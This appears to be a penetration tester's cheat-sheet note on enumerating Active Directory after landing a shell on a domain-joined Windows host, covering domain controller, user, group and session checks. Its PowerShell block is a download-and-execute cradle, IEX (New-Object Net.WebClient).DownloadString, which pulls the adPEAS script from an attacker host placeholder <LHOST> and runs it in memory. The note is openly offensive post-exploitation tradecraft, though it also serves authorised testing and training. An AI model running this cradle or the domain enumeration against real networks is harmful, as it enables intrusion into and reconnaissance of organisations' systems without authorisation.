---
title: AD Windows Enum
type: note
tab: Active Directory
inputs: [Shell]
outputs: [Domain, Users, Groups, Sessions]
tags: [ActiveDirectory, Windows, Enumeration]
---

# AD Windows Enum

## Purpose

- Use this after landing on a domain-joined Windows host.
- Generic Windows host checks now live in [[../../Post-Exploitation/Windows Post-Exploitation]].

## AD-Focused Checks

- Confirm the box is domain joined and note the current logon server / DC.
- Enumerate domain users, groups, and active sessions.
- Run AD-oriented host enum tooling like `adPEAS` when you need a broad domain-aware snapshot.

#Shell #Windows #ActiveDirectory #Enumeration
Run `adPEAS` from memory or from disk to collect AD-relevant findings from the current host.

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/adPEAS.ps1')
. .\adPEAS.ps1
Invoke-adPEAS
```

## Next

- Generic Windows shell enum: [[../../Post-Exploitation/Windows Post-Exploitation]]
- AD post-creds workflow: [[Post_Creds_Enum]]
